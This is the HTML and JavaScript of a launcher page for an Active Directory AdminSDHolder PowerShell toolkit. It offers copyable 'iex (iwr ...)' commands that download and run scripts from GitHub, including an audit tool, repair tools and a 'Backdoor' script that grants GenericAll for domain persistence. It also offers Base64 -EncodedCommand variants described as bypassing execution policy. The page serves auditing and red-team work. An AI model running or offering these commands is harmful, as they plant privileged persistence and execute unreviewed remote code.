<html lang="en">

<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg:      #060606;
  --s1:      #0d0d0d;
  --s2:      #111;
  --border:  #1c1c1c;
  --dim:     #252525;
  --text:    #cccccc;
  --muted:   #444;
  --faint:   #1e1e1e;
  --accent:  #c0392b;
  --accent2: #e74c3c;
  --blue:    #1a6fff;
  --green:   #27ae60;
  --mono:    'Courier New', Courier, monospace;
}

html, body { height: 100%; background: var(--bg); color: var(--text); font-family: var(--mono); overflow-x: hidden; }

body::before {
  content: ''; position: fixed; inset: 0;
  background: repeating-linear-gradient(to bottom,
    transparent 0px, transparent 3px,
    rgba(0,0,0,0.07) 3px, rgba(0,0,0,0.07) 4px);
  pointer-events: none; z-index: 1000;
}

.bg-glow {
  position: fixed; inset: 0;
  background: radial-gradient(ellipse 80% 60% at 50% 55%,
    rgba(192,57,43,.05) 0%, transparent 70%);
  animation: glow-breathe 5s ease-in-out infinite;
  pointer-events: none; z-index: 0;
}
@keyframes glow-breathe { 0%,100%{opacity:.6} 50%{opacity:1} }

.bg-grid {
  position: fixed; inset: 0;
  background-image:
    linear-gradient(rgba(255,255,255,.012) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,.012) 1px, transparent 1px);
  background-size: 40px 40px;
  pointer-events: none; z-index: 0;
}

.page {
  position: relative; z-index: 1;
  min-height: 100vh;
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  padding: 2.5rem 1.5rem 3.5rem; gap: 2.8rem;
}

.header { text-align: center; display: flex; flex-direction: column; align-items: center; gap: .9rem; }

.req-pill {
  display: inline-flex; align-items: center; gap: .5rem;
  font-size: .6rem; letter-spacing: .18em; text-transform: uppercase;
  color: var(--muted); border: 1px solid var(--faint);
  padding: .22rem .75rem; border-radius: 2px;
}
.req-pill::before {
  content: ''; width: 5px; height: 5px; border-radius: 50%;
  background: var(--accent); animation: blink 2.4s infinite;
}
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.25} }

.glitch {
  font-size: clamp(1.2rem, 4.5vw, 3.2rem);
  font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
  color: var(--text); position: relative; user-select: none;
}
.glitch::before, .glitch::after {
  content: attr(data-text);
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
}
.glitch::before {
  color: var(--accent2);
  clip-path: inset(100% 0 0 0);
  animation: gb 5s infinite;
}
.glitch::after {
  color: rgba(195,195,195,.85);
  clip-path: inset(100% 0 0 0);
  animation: ga 5s infinite;
}
@keyframes gb {
  0%,81%,87%,93%,100% { clip-path:inset(100% 0 0 0); transform:translate(0); opacity:1; }
  82%   { clip-path:polygon(0 11%,100% 11%,100% 20%,0 20%); transform:translate(-11px,0); }
  83%   { clip-path:polygon(0 44%,100% 44%,100% 53%,0 53%,0 7%,100% 7%,100% 15%,0 15%); transform:translate(7px,0); }
  84%   { clip-path:polygon(0 67%,100% 67%,100% 75%,0 75%); transform:translate(-5px,0); }
  85%   { clip-path:polygon(0 29%,100% 29%,100% 37%,0 37%); transform:translate(9px,0); }
  86%   { clip-path:inset(100% 0 0 0); transform:translate(0); }
  91%   { clip-path:polygon(0 19%,100% 19%,100% 27%,0 27%); transform:translate(-6px,0); opacity:.4; }
  92%   { clip-path:inset(100% 0 0 0); opacity:0; }
}
@keyframes ga {
  0%,81%,87%,93%,100% { clip-path:inset(100% 0 0 0); transform:translate(0); opacity:1; }
  82.4% { clip-path:polygon(0 57%,100% 57%,100% 66%,0 66%); transform:translate(10px,0); }
  83.4% { clip-path:polygon(0 24%,100% 24%,100% 32%,0 32%,0 71%,100% 71%,100% 79%,0 79%); transform:translate(-7px,0); }
  84.4% { clip-path:polygon(0 49%,100% 49%,100% 58%,0 58%); transform:translate(5px,0); }
  85.4% { clip-path:polygon(0 14%,100% 14%,100% 21%,0 21%); transform:translate(-8px,0); }
  86.4% { clip-path:inset(100% 0 0 0); transform:translate(0); }
  91.5% { clip-path:polygon(0 59%,100% 59%,100% 67%,0 67%); transform:translate(5px,0); opacity:.3; }
  92.5% { clip-path:inset(100% 0 0 0); opacity:0; }
}

.tagline {
  font-size: clamp(.65rem, 1.6vw, .8rem);
  letter-spacing: .18em; text-transform: uppercase;
  color: var(--muted); text-align: center;
}
.tagline .sep { color: #2a2a2a; margin: 0 .4rem; }

.scenario-block { width: 100%; max-width: 820px; display: flex; flex-direction: column; gap: 0; }

.tabs {
  display: flex; gap: 0;
  border-bottom: 1px solid var(--border);
  overflow-x: auto;
}
.tab {
  background: none; border: none; cursor: pointer;
  font-family: var(--mono); font-size: .68rem;
  letter-spacing: .12em; text-transform: uppercase;
  color: var(--muted);
  padding: .65rem 1.1rem;
  border-bottom: 2px solid transparent;
  margin-bottom: -1px;
  transition: color .15s, border-color .15s;
  white-space: nowrap;
  display: flex; align-items: center; gap: .45rem;
}
.tab:hover { color: var(--text); }
.tab.active { color: var(--text); border-bottom-color: var(--accent); }
.kbd {
  display: inline-block; font-size: .55rem; color: var(--faint);
  border: 1px solid var(--faint); padding: .05rem .28rem; border-radius: 2px;
  transition: color .15s, border-color .15s;
}
.tab:hover .kbd, .tab.active .kbd { color: var(--muted); border-color: var(--dim); }

.terminal {
  background: var(--s1);
  border: 1px solid var(--border); border-top: none;
  border-radius: 0 0 5px 5px; overflow: hidden;
  transition: box-shadow .3s;
}
.terminal:hover { box-shadow: 0 0 50px rgba(192,57,43,.08), 0 8px 40px rgba(0,0,0,.4); }

.term-bar {
  background: var(--s2); padding: .55rem 1rem;
  display: flex; align-items: center; gap: .45rem;
  border-bottom: 1px solid var(--border);
}
.dot { width: 9px; height: 9px; border-radius: 50%; transition: background .25s; }
.dot-r { background: #3d1a1a; }
.dot-y { background: #2e2a14; }
.dot-g { background: #152a1a; }
.terminal:hover .dot-r { background: #c0392b; }
.terminal:hover .dot-y { background: #c0892b; }
.terminal:hover .dot-g { background: #27ae60; }
.term-label { font-size: .62rem; color: var(--muted); margin: 0 auto; padding-right: 28px; letter-spacing: .05em; }

.term-body {
  padding: 1.1rem 1.4rem;
  display: flex; align-items: flex-start; gap: .8rem;
  min-height: 3.4rem; overflow-x: auto;
}
.ps { color: var(--accent2); font-size: .95rem; flex-shrink: 0; margin-top: .05rem; user-select: none; }

#cmd-display {
  font-size: clamp(.68rem, 1.6vw, .82rem); line-height: 1.55; flex: 1;
  white-space: nowrap;
  animation: cmd-in .18s ease;
}
@keyframes cmd-in { from{opacity:0;transform:translateY(3px)} to{opacity:1;transform:none} }

.kw   { color: #569cd6; }
.str  { color: #ce9178; }
.url  { color: #4ec9b0; }
.sep  { color: var(--muted); }
.flag { color: #dcdcaa; }
.cmd  { color: #b5cea8; }

.tab-desc {
  font-size: .64rem; letter-spacing: .08em;
  color: var(--muted); margin-top: .7rem; min-height: 1rem;
  animation: cmd-in .18s ease;
}
.tab-desc .hl { color: var(--text); }

.enc-sel { display: none; gap: .5rem; margin-top: .6rem; flex-wrap: wrap; }
.enc-sel.visible { display: flex; }
.enc-pill {
  background: none; border: 1px solid var(--faint); cursor: pointer;
  font-family: var(--mono); font-size: .6rem;
  letter-spacing: .1em; text-transform: uppercase;
  color: var(--muted); padding: .28rem .65rem; border-radius: 2px;
  transition: color .15s, border-color .15s;
}
.enc-pill:hover { color: var(--text); border-color: var(--border); }
.enc-pill.active { color: var(--text); border-color: var(--accent); }

.actions { display: flex; gap: .8rem; margin-top: 1.2rem; align-items: center; flex-wrap: wrap; }

.copy-btn {
  background: var(--accent); color: #fff; border: none;
  padding: .8rem 2rem; font-family: var(--mono); font-size: .72rem;
  letter-spacing: .15em; text-transform: uppercase;
  cursor: pointer; border-radius: 3px;
  transition: background .15s, box-shadow .2s, transform .1s;
}
.copy-btn:hover { background: var(--accent2); box-shadow: 0 0 24px rgba(231,76,60,.28); }
.copy-btn:active { transform: scale(.97); }
.copy-btn.ok { background: #1b6e3a; box-shadow: 0 0 24px rgba(39,174,96,.2); }

.kbd-hint { font-size: .6rem; letter-spacing: .1em; color: var(--muted); }
.kbd-hint kbd {
  font-family: var(--mono); border: 1px solid var(--dim);
  padding: .1rem .3rem; border-radius: 2px; font-size: .58rem; color: var(--muted);
  cursor: pointer; transition: color .15s, border-color .15s;
}
.kbd-hint kbd:hover { color: var(--text); border-color: var(--border); }

.links { display: flex; gap: 1.2rem; flex-wrap: wrap; justify-content: center; }
.lnk {
  font-family: var(--mono); font-size: .66rem;
  letter-spacing: .12em; text-transform: uppercase;
  color: var(--muted); text-decoration: none;
  border: 1px solid var(--faint); padding: .5rem 1.1rem; border-radius: 3px;
  transition: color .15s, border-color .15s;
}
.lnk:hover { color: var(--text); border-color: var(--border); }

footer {
  position: fixed; bottom: 1rem; left: 0; right: 0;
  text-align: center; font-size: .6rem;
  letter-spacing: .1em; color: #1e1e1e;
  pointer-events: none; z-index: 1;
}
footer a { color: #2a2a2a; text-decoration: none; pointer-events: all; transition: color .15s; }
footer a:hover { color: var(--muted); }

@media (max-width: 700px) {
  .page { gap: 2.2rem; }
  .term-label { display: none; }
}
@media (max-width: 560px) {
  .page { gap: 1.8rem; padding: 2rem 1rem 3.5rem; }
  .tab { padding: .6rem .7rem; font-size: .61rem; letter-spacing: .08em; }
  .term-body { padding: .9rem 1rem; }
  .actions { flex-direction: column; align-items: stretch; }
  .copy-btn { width: 100%; padding: .9rem 1rem; }
  .kbd-hint { display: none; }
}
@media (max-width: 380px) {
  .page { padding: 1.5rem .75rem 3.5rem; gap: 1.5rem; }
  .glitch { letter-spacing: .02em; }
  .req-pill { font-size: .55rem; letter-spacing: .1em; }
  .tab { padding: .55rem .6rem; font-size: .58rem; letter-spacing: .05em; }
  .links { gap: .7rem; }
  .lnk { padding: .45rem .85rem; font-size: .62rem; }
}
</style>

<script>
const RAW = 'https://raw.githubusercontent.com/franckferman/AD-AdminSDHolder-Toolkit/stable/Public/';

const S = [
  {
    raw:  `iex (iwr '${RAW}Get-AdminSDHolderACL.ps1' -UseBasicParsing).Content`,
    html: `<span class="kw">iex</span> <span class="sep">(</span><span class="kw">iwr</span> <span class="str">'${RAW}Get-AdminSDHolderACL.ps1'</span> <span class="flag">-UseBasicParsing</span><span class="sep">).</span><span class="kw">Content</span>`,
    desc: `Audit <span class="hl">AdminSDHolder ACL</span> &mdash; flags <span class="hl">GenericAll</span>, <span class="hl">WriteDacl</span>, <span class="hl">WriteOwner</span> from non-whitelisted principals. Read-only.`,
  },
  {
    raw:  `iex (iwr '${RAW}Invoke-AdminSDHolderCleanup.ps1' -UseBasicParsing).Content`,
    html: `<span class="kw">iex</span> <span class="sep">(</span><span class="kw">iwr</span> <span class="str">'${RAW}Invoke-AdminSDHolderCleanup.ps1'</span> <span class="flag">-UseBasicParsing</span><span class="sep">).</span><span class="kw">Content</span>`,
    desc: `Audit orphaned <span class="hl">AdminCount=1</span> accounts no longer in any protected group. Read-only by default &mdash; pass <span class="hl">-Remediate</span> to clean up.`,
  },
  {
    raw:  `iex (iwr '${RAW}Repair-AdminSDHolderACL.ps1' -UseBasicParsing).Content`,
    html: `<span class="kw">iex</span> <span class="sep">(</span><span class="kw">iwr</span> <span class="str">'${RAW}Repair-AdminSDHolderACL.ps1'</span> <span class="flag">-UseBasicParsing</span><span class="sep">).</span><span class="kw">Content</span>`,
    desc: `Remove unauthorized ACEs from <span class="hl">AdminSDHolder</span>. Read-only by default &mdash; pass <span class="hl">-Remediate</span> to commit changes.`,
  },
  {
    raw:  `iex (iwr '${RAW}Add-AdminSDHolderBackdoor.ps1' -UseBasicParsing).Content`,
    html: `<span class="kw">iex</span> <span class="sep">(</span><span class="kw">iwr</span> <span class="str">'${RAW}Add-AdminSDHolderBackdoor.ps1'</span> <span class="flag">-UseBasicParsing</span><span class="sep">).</span><span class="kw">Content</span>`,
    desc: `Grant <span class="hl">GenericAll</span> to a specified principal on <span class="hl">AdminSDHolder</span>. SDProp propagates to all protected accounts within <span class="hl">60 min</span>.`,
  },
  { raw: '', html: '', desc: '' },
];

const ENC = [
  {
    b64:  'aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGYAcgBhAG4AYwBrAGYAZQByAG0AYQBuAC8AQQBEAC0AQQBkAG0AaQBuAFMARABIAG8AbABkAGUAcgAtAFQAbwBvAGwAawBpAHQALwBzAHQAYQBiAGwAZQAvAFAAdQBiAGwAaQBjAC8ARwBlAHQALQBBAGQAbQBpAG4AUwBEAEgAbwBsAGQAZQByAEEAQwBMAC4AcABzADEAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAuAEMAbwBuAHQAZQBuAHQA',
    desc: `<span class="hl">-EncodedCommand</span> (Base64 UTF-16LE) &mdash; <span class="hl">Get-AdminSDHolderACL</span>. Execution policy <span class="hl">Restricted</span> / <span class="hl">AllSigned</span> not enforced.`,
  },
  {
    b64:  'aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGYAcgBhAG4AYwBrAGYAZQByAG0AYQBuAC8AQQBEAC0AQQBkAG0AaQBuAFMARABIAG8AbABkAGUAcgAtAFQAbwBvAGwAawBpAHQALwBzAHQAYQBiAGwAZQAvAFAAdQBiAGwAaQBjAC8ASQBuAHYAbwBrAGUALQBBAGQAbQBpAG4AUwBEAEgAbwBsAGQAZQByAEMAbABlAGEAbgB1AHAALgBwAHMAMQAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA=',
    desc: `<span class="hl">-EncodedCommand</span> (Base64 UTF-16LE) &mdash; <span class="hl">Invoke-AdminSDHolderCleanup</span>. Execution policy <span class="hl">Restricted</span> / <span class="hl">AllSigned</span> not enforced.`,
  },
  {
    b64:  'aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGYAcgBhAG4AYwBrAGYAZQByAG0AYQBuAC8AQQBEAC0AQQBkAG0AaQBuAFMARABIAG8AbABkAGUAcgAtAFQAbwBvAGwAawBpAHQALwBzAHQAYQBiAGwAZQAvAFAAdQBiAGwAaQBjAC8AUgBlAHAAYQBpAHIALQBBAGQAbQBpAG4AUwBEAEgAbwBsAGQAZQByAEEAQwBMAC4AcABzADEAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAuAEMAbwBuAHQAZQBuAHQA',
    desc: `<span class="hl">-EncodedCommand</span> (Base64 UTF-16LE) &mdash; <span class="hl">Repair-AdminSDHolderACL</span>. Execution policy <span class="hl">Restricted</span> / <span class="hl">AllSigned</span> not enforced.`,
  },
  {
    b64:  'aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGYAcgBhAG4AYwBrAGYAZQByAG0AYQBuAC8AQQBEAC0AQQBkAG0AaQBuAFMARABIAG8AbABkAGUAcgAtAFQAbwBvAGwAawBpAHQALwBzAHQAYQBiAGwAZQAvAFAAdQBiAGwAaQBjAC8AQQBkAGQALQBBAGQAbQBpAG4AUwBEAEgAbwBsAGQAZQByAEIAYQBjAGsAZABvAG8AcgAuAHAAcwAxACcAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA==',
    desc: `<span class="hl">-EncodedCommand</span> (Base64 UTF-16LE) &mdash; <span class="hl">Add-AdminSDHolderBackdoor</span>. Execution policy <span class="hl">Restricted</span> / <span class="hl">AllSigned</span> not enforced.`,
  },
];

let cur    = 0;
let curEnc = 0;

function encHtml(b64) {
  return `<span class="cmd">powershell.exe</span> <span class="flag">-NonInteractive -NoProfile -NoLogo</span> <span class="flag">-EncodedCommand</span> <span class="str">${b64}</span>`;
}

function setEnc(i) {
  curEnc = i;
  document.querySelectorAll('.enc-pill').forEach((p, idx) => p.classList.toggle('active', idx === i));
  const b64 = ENC[i].b64;
  S[4].raw  = `powershell.exe -NonInteractive -NoProfile -NoLogo -EncodedCommand ${b64}`;
  S[4].html = encHtml(b64);
  S[4].desc = ENC[i].desc;
  const d = document.getElementById('cmd-display');
  d.innerHTML = '';
  void d.offsetWidth;
  d.innerHTML = S[4].html;
  document.getElementById('tab-desc').innerHTML = S[4].desc;
}

function setTab(i) {
  cur = i;
  document.querySelectorAll('.tab').forEach((t, idx) => t.classList.toggle('active', idx === i));
  const sel = document.getElementById('enc-sel');
  if (i === 4) {
    sel.classList.add('visible');
    setEnc(curEnc);
    return;
  }
  sel.classList.remove('visible');
  const d = document.getElementById('cmd-display');
  d.innerHTML = '';
  void d.offsetWidth;
  d.innerHTML = S[i].html;
  document.getElementById('tab-desc').innerHTML = S[i].desc;
}

function copyCmd() {
  const btn = document.getElementById('copy-btn');
  navigator.clipboard.writeText(S[cur].raw).then(() => {
    btn.textContent = 'Copied!';
    btn.classList.add('ok');
    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1800);
  });
}

document.addEventListener('keydown', e => {
  const n = parseInt(e.key);
  if (n >= 1 && n <= S.length && !e.ctrlKey && !e.metaKey && !e.altKey) setTab(n - 1);
});

setTab(0);
</script>
